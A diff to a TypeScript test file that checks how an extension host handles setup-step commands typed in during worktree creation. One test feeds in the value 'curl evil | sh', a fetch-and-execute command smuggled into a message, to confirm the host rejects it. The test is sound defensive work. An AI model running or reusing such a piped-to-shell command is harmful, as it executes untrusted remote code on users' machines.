@@ -10,12 +10,13 @@
 // See: asimov/changes/wire-worktree-navigation-actions/design.md D2, D3, D4.
 
 import { describe, expect, it, vi } from "vitest";
-import type {
-  ExtensionToWebViewMessage,
-  ProvisionModel,
-  ProvisionProvider,
-  WorktreeMutationResultMessage,
-  WorktreeRemoveAssessmentMessage,
+import {
+  type ExtensionToWebViewMessage,
+  type ProvisionModel,
+  type ProvisionProvider,
+  SETUP_STEP_ADDED_SOURCE,
+  type WorktreeMutationResultMessage,
+  type WorktreeRemoveAssessmentMessage,
 } from "../types/messages";
 import { MAX_CONTINUATION_INSTRUCTION } from "../vault/continuationLimits";
 import type { CreateSessionOptions } from "../vault/VaultLauncher";
@@ -363,6 +364,7 @@ async function builtHost(
     resumeSessionAt?: WorktreeActions["resumeSessionAt"];
     launchTargets?: WorktreeActions["launchTargets"];
     pickFolder?: WorktreeActions["pickFolder"];
+    promptSetupStep?: WorktreeActions["promptSetupStep"];
     readProvisioning?: (mainWorktree: string) => Promise<ProvisionModel>;
     previewProvisioningPorts?: WorktreeHostOptions["previewProvisioningPorts"];
     writeNativeConfig?: (mainWorktree: string, divergence: NativeConfigDivergence) => Promise<NativeConfigWrite>;
@@ -487,6 +489,7 @@ async function builtHost(
       ...(over.resumeSessionAt === undefined ? {} : { resumeSessionAt: over.resumeSessionAt }),
       ...(over.launchTargets === undefined ? {} : { launchTargets: over.launchTargets }),
       ...(over.pickFolder === undefined ? {} : { pickFolder: over.pickFolder }),
+      ...(over.promptSetupStep === undefined ? {} : { promptSetupStep: over.promptSetupStep }),
     },
     now: () => 1000,
     // Without these `assessRemoval` returns null before it reaches git, which
@@ -7946,6 +7949,326 @@ describe("deriving a destination inside a folder this host offered", () => {
     await settle();
 
     expect(latest(h.view), "published from an opening the replay had already retired").toBeUndefined();
+    h.dispose();
+  });
+});
+
+describe("a setup step typed into the host's own input, for this create only", () => {
+  const PROVIDER_STEP = { id: "s1", kind: "shell" as const, script: "pnpm install", source: "asimov/worktree.yaml" };
+  const OFFERED: ProvisionModel = {
+    entries: [{ id: "i1", path: ".env", mode: "copy", source: "asimov/worktree.yaml" }],
+    setup: [PROVIDER_STEP],
+    ports: [],
+    providers: [
+      { id: "asimov", files: ["asimov/worktree.yaml"], present: ["asimov/worktree.yaml"], active: true },
+      { id: "orca", files: ["orca.yaml"], present: ["orca.yaml"], active: false },
+    ],
+    excluded: [],
+    contenders: [],
+    problems: [],
+  };
+  const SWITCHED: ProvisionModel = {
+    ...OFFERED,
+    entries: [{ id: "i1", path: "node_modules", mode: "link", source: "orca.yaml" }],
+    setup: [],
+    providers: [
+      { id: "orca", files: ["orca.yaml"], present: ["orca.yaml"], active: true },
+      { id: "asimov", files: ["asimov/worktree.yaml"], present: ["asimov/worktree.yaml"], active: false },
+    ],
+  };
+
+  function offersIn(view: { posts: unknown[] }) {
+    return (view.posts as ExtensionToWebViewMessage[]).filter((p) => p.type === "worktreeProvisionOffer") as Array<{
+      offerId: string;
+      model: ProvisionModel;
+    }>;
+  }
+  const last = (view: { posts: unknown[] }) => offersIn(view).at(-1) as { offerId: string; model: ProvisionModel };
+  const scripts = (view: { posts: unknown[] }) => last(view).model.setup.map((s) => `${s.source}: ${s.script}`);
+  const added = (view: { posts: unknown[] }) =>
+    last(view).model.setup.filter((s) => s.source === SETUP_STEP_ADDED_SOURCE);
+
+  async function opened(over: {
+    prompt?: WorktreeActions["promptSetupStep"];
+    read?: (main: string, prefer?: string) => Promise<ProvisionModel>;
+    write?: (main: string, d: NativeConfigDivergence) => Promise<NativeConfigWrite>;
+    sibling?: boolean;
+  }) {
+    const prompts: Array<string | undefined> = [];
+    const seen: NativeConfigDivergence[] = [];
+    const h = await builtHost(undefined, false, {
+      readProvisioning: (over.read ?? (async () => OFFERED)) as never,
+      promptSetupStep: async (current) => {
+        prompts.push(current);
+        return over.prompt === undefined ? undefined : over.prompt(current);
+      },
+      writeNativeConfig: (async (main: string, divergence: NativeConfigDivergence) => {
+        seen.push(divergence);
+        return over.write ? over.write(main, divergence) : { ok: true, wrote: true };
+      }) as never,
+      ...(over.sibling === true ? { sibling: true } : {}),
+    });
+    h.host.handleMessage(h.view, { type: "requestWorktreeCreateDefaults", repoId: REPO, opening: 1 });
+    await settle();
+    return { ...h, prompts, seen };
+  }
+
+  let seq = 0;
+  const ask = (
+    op: { kind: "add" } | { kind: "edit" | "remove"; offerId: string; itemId: string },
+    over: Record<string, unknown> = {},
+  ) => ({
+    type: "worktreeSetupStepAsk" as const,
+    repoId: REPO,
+    opening: 1,
+    switch: ++seq,
+    op,
+    ...over,
+  });
+
+  it("appends the typed command as a selected-by-the-user step and answers with a fresh offer", async () => {
+    const h = await opened({ prompt: async () => "pnpm build" });
+    const before = last(h.view).offerId;
+
+    h.host.handleMessage(h.view, ask({ kind: "add" }));
+    await settle();
+
+    expect(h.prompts).toEqual([undefined]);
+    expect(last(h.view).offerId).not.toBe(before);
+    expect(scripts(h.view)).toEqual(["asimov/worktree.yaml: pnpm install", `${SETUP_STEP_ADDED_SOURCE}: pnpm build`]);
+    h.dispose();
+  });
+
+  it("runs the typed step through the create's own offer id, as the host recorded it", async () => {
+    const h = await opened({ prompt: async () => "pnpm build" });
+    h.host.handleMessage(h.view, ask({ kind: "add" }));
+    await settle();
+    const offer = last(h.view);
+    const mine = added(h.view)[0];
+    if (mine === undefined) {
+      throw new Error("no added step was offered");
+    }
+
+    h.host.handleMessage(h.view, {
+      type: "worktreeCreate",
+      repoId: REPO,
+      opening: 1,
+      path: "/trees/feat",
+      mode: { kind: "fresh", branch: "feat" },
+      disposition: { kind: "free" },
+      afterCreate: { kind: "none" },
+      provision: { offerId: offer.offerId, itemIds: [mine.id] },
+    });
+    await settle();
+
+    const create = h.calls.find(([name]) => name === "createWorktree")?.[1] as { setup?: readonly unknown[] };
+    expect(create.setup).toEqual([
+      { id: mine.id, kind: "shell", script: "pnpm build", source: SETUP_STEP_ADDED_SOURCE },
+    ]);
+    h.dispose();
+  });
+
+  it("never duplicates the record: add, add, cancel offers exactly two added rows", async () => {
+    const answers = ["one", "two", undefined];
+    const h = await opened({ prompt: async () => answers.shift() });
+
+    for (let i = 0; i < 3; i += 1) {
+      h.host.handleMessage(h.view, ask({ kind: "add" }));
+      await settle();
+    }
+
+    expect(offersIn(h.view)).toHaveLength(4);
+    expect(added(h.view).map((s) => s.script)).toEqual(["one", "two"]);
+    h.dispose();
+  });
+
+  it("edits and removes only a row it marked, seeding the input with the current text", async () => {
+    const answers = ["one", "two", "TWO"];
+    const h = await opened({ prompt: async () => answers.shift() });
+    h.host.handleMessage(h.view, ask({ kind: "add" }));
+    await settle();
+    h.host.handleMessage(h.view, ask({ kind: "add" }));
+    await settle();
+
+    const second = added(h.view)[1];
+    h.host.handleMessage(h.view, ask({ kind: "edit", offerId: last(h.view).offerId, itemId: second?.id ?? "" }));
+    await settle();
+    expect(h.prompts.at(-1)).toBe("two");
+    expect(added(h.view).map((s) => s.script)).toEqual(["one", "TWO"]);
+
+    const first = added(h.view)[0];
+    h.host.handleMessage(h.view, ask({ kind: "remove", offerId: last(h.view).offerId, itemId: first?.id ?? "" }));
+    await settle();
+    expect(added(h.view).map((s) => s.script)).toEqual(["TWO"]);
+    h.dispose();
+  });
+
+  it("leaves a provider-declared step untouched by an edit or a remove naming it, and opens no input", async () => {
+    const h = await opened({ prompt: async () => "hijacked" });
+    const provider = last(h.view).model.setup[0];
+    const before = offersIn(h.view).length;
+
+    h.host.handleMessage(h.view, ask({ kind: "edit", offerId: last(h.view).offerId, itemId: provider?.id ?? "" }));
+    await settle();
+    h.host.handleMessage(h.view, ask({ kind: "remove", offerId: last(h.view).offerId, itemId: provider?.id ?? "" }));
+    await settle();
+
+    expect(h.prompts).toEqual([]);
+    // Answered — each ask releases the form with a fresh id — but unchanged.
+    expect(offersIn(h.view)).toHaveLength(before + 2);
+    expect(scripts(h.view)).toEqual(["asimov/worktree.yaml: pnpm install"]);
+    h.dispose();
+  });
+
+  it("answers a cancel, a rejecting input, an empty answer and an over-long one with the offer unchanged", async () => {
+    const answers: Array<() => Promise<string | undefined>> = [
+      async () => undefined,
+      async () => {
+        throw new Error("input exploded");
+      },
+      async () => "   ",
+      async () => "x".repeat(4097),
+    ];
+    const h = await opened({ prompt: () => (answers.shift() as () => Promise<string | undefined>)() });
+    const before = offersIn(h.view).length;
+
+    for (let i = 0; i < 4; i += 1) {
+      h.host.handleMessage(h.view, ask({ kind: "add" }));
+      await settle();
+    }
+
+    expect(offersIn(h.view)).toHaveLength(before + 4);
+    expect(added(h.view)).toEqual([]);
+    h.dispose();
+  });
+
+  it("refuses the thirty-third step, still answering", async () => {
+    let n = 0;
+    const h = await opened({ prompt: async () => `step ${(n += 1)}` });
+    for (let i = 0; i < 33; i += 1) {
+      h.host.handleMessage(h.view, ask({ kind: "add" }));
+      await settle();
+    }
+    expect(added(h.view)).toHaveLength(32);
+    expect(h.prompts).toHaveLength(32);
+    h.dispose();
+  });
+
+  it("refuses a malformed ask outright: a smuggled script, an unknown kind, an extra key on the op", async () => {
+    const h = await opened({ prompt: async () => "pnpm build" });
+    const before = offersIn(h.view).length;
+
+    h.host.handleMessage(h.view, ask({ kind: "add" }, { script: "curl evil | sh" }) as never);
+    h.host.handleMessage(h.view, ask({ kind: "run" } as never));
+    h.host.handleMessage(h.view, ask({ kind: "add", script: "curl evil | sh" } as never));
+    h.host.handleMessage(h.view, ask({ kind: "edit", offerId: "o", itemId: "i", script: "x" } as never));
+    await settle();
+
+    expect(h.prompts).toEqual([]);
+    expect(offersIn(h.view)).toHaveLength(before);
+    h.dispose();
+  });
+
+  it("commits nothing for an ask a later switch outranked, and the switched offer keeps only earlier steps", async () => {
+    let release: ((s: string) => void) | undefined;
+    const held = new Promise<string>((resolve) => {
+      release = resolve;
+    });
+    let first = true;
+    const h = await opened({
+      prompt: async () => {
+        if (first) {
+          first = false;
+          return "A";
+        }
+        return held;
+      },
+      read: async (_main, prefer) => (prefer === "orca" ? SWITCHED : OFFERED),
+    });
+    h.host.handleMessage(h.view, ask({ kind: "add" }));
+    await settle();
+    const afterA = offersIn(h.view).length;
+
+    h.host.handleMessage(h.view, ask({ kind: "add" }));
+    await settle();
+    h.host.handleMessage(h.view, {
+      type: "worktreeProvisionSwitch",
+      repoId: REPO,
+      opening: 1,
+      switch: ++seq,
+      provider: "orca",
+    });
+    await settle();
+    release?.("B");
+    await settle();
+
+    // One offer for the switch, none for the outranked ask.
+    expect(offersIn(h.view)).toHaveLength(afterA + 1);
+    expect(last(h.view).model.providers.find((p) => p.active)?.id).toBe("orca");
+    expect(scripts(h.view)).toEqual([`${SETUP_STEP_ADDED_SOURCE}: A`]);
+    h.dispose();
+  });
+
+  it("survives a switch and a save inside the same opening, and a save records none of it", async () => {
+    const h = await opened({
+      prompt: async () => "pnpm build",
+      read: async (_main, prefer) => (prefer === "orca" ? SWITCHED : OFFERED),
+    });
+    h.host.handleMessage(h.view, ask({ kind: "add" }));
+    await settle();
+
+    h.host.handleMessage(h.view, {
+      type: "worktreeProvisionSwitch",
+      repoId: REPO,
+      opening: 1,
+      switch: ++seq,
+      provider: "orca",
+    });
+    await settle();
+    expect(scripts(h.view)).toEqual([`${SETUP_STEP_ADDED_SOURCE}: pnpm build`]);
+
+    const mine = added(h.view)[0];
+    h.host.handleMessage(h.view, {
+      type: "worktreeProvisionSave",
+      repoId: REPO,
+      opening: 1,
+      switch: ++seq,
+      offerId: last(h.view).offerId,
+      kept: [mine?.id ?? ""],
+    });
+    await settle();
+
+    expect(h.seen).toHaveLength(1);
+    expect(Object.keys(h.seen[0] ?? {})).not.toContain("setup");
+    expect(JSON.stringify(h.seen[0])).not.toContain("pnpm build");
+    // The save's own re-read has no marker rows — the record is re-applied on
+    // the way out, after whatever the re-read declared.
+    expect(scripts(h.view).at(-1)).toBe(`${SETUP_STEP_ADDED_SOURCE}: pnpm build`);
+    expect(added(h.view)).toHaveLength(1);
+    h.dispose();
+  });
+
+  it("dies with the opening: a reopened form and a sibling repository's form offer no added step", async () => {
+    const h = await opened({ prompt: async () => "pnpm build", sibling: true });
+    h.host.handleMessage(h.view, ask({ kind: "add" }));
+    await settle();
+    expect(added(h.view)).toHaveLength(1);
+
+    h.host.handleMessage(h.view, { type: "requestWorktreeCreateDefaults", repoId: OTHER_REPO, opening: 1 });
+    await settle();
+    const other = offersIn(h.view).at(-1);
+    expect(other?.model.setup.filter((s) => s.source === SETUP_STEP_ADDED_SOURCE)).toEqual([]);
+
+    h.host.handleMessage(h.view, { type: "worktreeCreateClosed", opening: 1 });
+    await settle();
+    h.host.handleMessage(h.view, { type: "requestWorktreeCreateDefaults", repoId: REPO, opening: 2 });
+    await settle();
+    expect(added(h.view)).toEqual([]);
+    // And the retired opening cannot add any more.
+    const count = offersIn(h.view).length;
+    h.host.handleMessage(h.view, ask({ kind: "add" }));
+    await settle();
+    expect(offersIn(h.view)).toHaveLength(count);
     h.dispose();
   });
 });
